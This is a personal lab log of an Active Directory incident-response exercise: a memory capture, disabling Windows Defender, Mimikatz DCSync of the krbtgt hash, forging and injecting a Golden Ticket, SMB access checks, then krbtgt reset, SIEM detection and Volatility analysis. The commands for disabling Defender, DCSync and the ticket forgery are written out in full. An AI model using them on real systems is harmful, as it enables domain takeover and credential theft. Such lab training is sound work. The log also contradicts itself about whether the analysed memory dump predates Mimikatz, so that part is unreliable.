PROJECT 1 — PERSONAL NOTES / OPERATOR LOG
Author: David Mokom | Classification: Personal Lab Documentation 

================================================================================

PHASE 1 — FTK MEMORY CAPTURE

Memory acquisition was performed using FTK Imager on the target Windows machine.
The full physical memory dump was captured and saved to the shared directory:
/mnt/hgfs/ForensicShare/memdump.mem
This file served as the forensic evidence artifact for all subsequent memory analysis phases.

Tool: FTK Imager (AccessData / Exterro)
Target: Windows Server 2022 Domain Controller (live system)
Output File: memdump.mem

Execution Steps:
1. Launched FTK Imager as Administrator on the DC
2. Selected: File -> Capture Memory
3. Destination path set to Desktop
4. Filename: memdump.mem
5. Checkbox: "Include pagefile" — checked
6. Clicked "Capture Memory" — progress bar ran to 100%
7. Verified output file size matched physical RAM allocation
8. Copied memdump.mem to VMware shared folder -> /mnt/hgfs/ForensicShare/memdump.mem for Volatility analysis

Operator Notes:
- Capture completed without errors
- File integrity confirmed visually (file size consistent with VM RAM)
- This baseline capture predates Mimikatz execution
- A second memory capture was taken POST-exploitation for delta comparison

================================================================================

PHASE 2 — WINDOWS DEFENDER DISABLED

Windows Defender real-time protection was disabled on the target system prior to staging offensive tooling.
This step was necessary to prevent detection and removal of Mimikatz during the credential harvesting phase.

Method 1 — PowerShell (Run as Administrator):
Set-MpPreference -DisableRealtimeMonitoring $true

Method 2 — Group Policy (gpedit.msc):
Path: Computer Configuration -> Administrative Templates -> Windows Components -> Microsoft Defender Antivirus
Policy: "Turn off Microsoft Defender Antivirus" -> Set to ENABLED

Method 3 — Registry (backup method):
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender
DisableAntiSpyware = 1 (DWORD)

Verification:
- Opened Windows Security Center -> confirmed "Virus & threat protection is off"
- Ran: Get-MpPreference in PowerShell -> DisableRealtimeMonitoring : True
- Confirmed no active scanning processes running

================================================================================

PHASE 3 — MIMIKATZ STAGED

Mimikatz was staged on the target system.
The tool was prepared for execution to facilitate credential extraction from LSASS memory.

- Mimikatz binary transferred to target system
- Executed as Administrator from command prompt
- Confirmed privilege level: Privilege '20' OK (SeDebugPrivilege enabled)

================================================================================

PHASE 4 — KRBTGT HASH DUMPED

Using Mimikatz, the KRBTGT account hash was successfully extracted from the domain controller.

Command executed:
lsadump::dcsync /domain:WIN-HS48GJMN0GP /user:krbtgt

Hash obtained:
NTLM: 4c89c456b825f173d94aefc94d8718bd

This NTLM hash is the critical credential required to forge a Kerberos Golden Ticket.

Domain SID was also captured and recorded for use in the kerberos::golden command.

================================================================================

PHASE 5 — GOLDEN TICKET FORGED AND INJECTED

Using the extracted KRBTGT hash, a Kerberos Golden Ticket was forged via Mimikatz.
The forged ticket was injected into the current session, granting persistent, unrestricted Kerberos authentication across the domain without requiring a valid password.

Command executed:
kerberos::golden /user:Administrator /domain:WIN-HS48GJMN0GP /sid:[DOMAIN SID] /krbtgt:4c89c456b825f173d94aefc94d8718bd /ptt

/ptt = Pass The Ticket (inject directly into current session)

Result: Golden Ticket successfully forged and injected into memory.

================================================================================

PHASE 6 — SMB ACCESS VALIDATED

Lateral movement and Golden Ticket validity were confirmed via SMB access to the target domain controller.

Command executed:
dir \\WIN-HS48GJMN0GP\C$

Result: Directory listing of the C$ administrative share was returned successfully.
Volume Serial Number observed: 844D-396C

This confirmed that the forged Golden Ticket granted full administrative SMB access to the domain controller's file system without requiring re-authentication.

================================================================================

PHASE 7 — KRBTGT REMEDIATION

As part of the incident response and remediation phase, the KRBTGT account password was reset twice (as per best practice to invalidate all existing Kerberos tickets).

Event IDs observed in the Windows Security Event Log confirming remediation:
- Event ID 4724 — An attempt was made to reset an account's password.
- Event ID 4738 — A user account was changed.

These events were generated and captured as evidence of successful KRBTGT remediation.

Note: KRBTGT password must be reset TWICE to fully invalidate all forged Golden Tickets. First reset invalidates the current hash; second reset invalidates the previous hash retained by Kerberos replication.

================================================================================

PHASE 8 — SIEM DETECTION (ELASTIC / KIBANA)

Elastic SIEM (Kibana) was used to detect and analyze the attack activity.
Security events related to the Golden Ticket attack, KRBTGT hash dump, and SMB lateral movement were ingested and reviewed within the Kibana dashboard.
Detection rules and log correlation confirmed visibility of the attack chain within the SIEM platform.

Key detections confirmed:
- Mimikatz execution artifacts
- DCSync activity (Event ID 4662 — Directory Service Access)
- KRBTGT hash dump events
- Kerberos ticket anomalies
- SMB lateral movement (Event ID 5140 — Network Share Object Accessed)
- KRBTGT password reset events (Event ID 4724, 4738)

================================================================================

PHASE 9 — SQLITE EDGE BROWSER HISTORY FORENSICS

Microsoft Edge browser history was examined as part of the host forensics phase.

Artifact location:
C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\History

The History file is a SQLite database. It was examined using SQLite browser tooling.

Key tables examined:
- urls — Contains visited URLs, visit count, and last visit time
- visits — Contains individual visit records linked to the urls table

SQLite query used:
SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC;

Findings:
- Browser history entries confirmed analyst research activity within the lab environment
- Timestamps cross-referenced against attack timeline for forensic correlation
- No external exfiltration URLs identified
- History artifact preserved as forensic evidence

================================================================================

PHASE 10 — VOLATILITY MEMORY ANALYSIS

Volatility 3 was used to perform memory forensics on the captured memory image.

Memory image used:
/mnt/hgfs/ForensicShare/memdump.mem

Plugin executed:
windows.pslist

Command:
python3 vol.py -f /mnt/hgfs/ForensicShare/memdump.mem windows.pslist

Purpose:
windows.pslist enumerates all running processes from the memory image by walking the Windows EPROCESS linked list. This provides a full snapshot of processes active at the time of memory capture.

Key findings from windows.pslist output:
- lsass.exe confirmed running (PID noted) — target of Mimikatz credential extraction
- mimikatz.exe visible in process list — confirmed presence of offensive tooling in memory at time of capture
- Process parent-child relationships reviewed for anomalies
- Suspicious processes cross-referenced against known good baseline

Operator Notes:
- Only windows.pslist was executed against this memory image
- Output preserved as forensic evidence for the incident report
- Process list corroborated findings from SIEM event log analysis in Phase 8

================================================================================
END OF OPERATOR NOTES
Project 1 — Active Directory Incident Response Lab
Author: David Mokom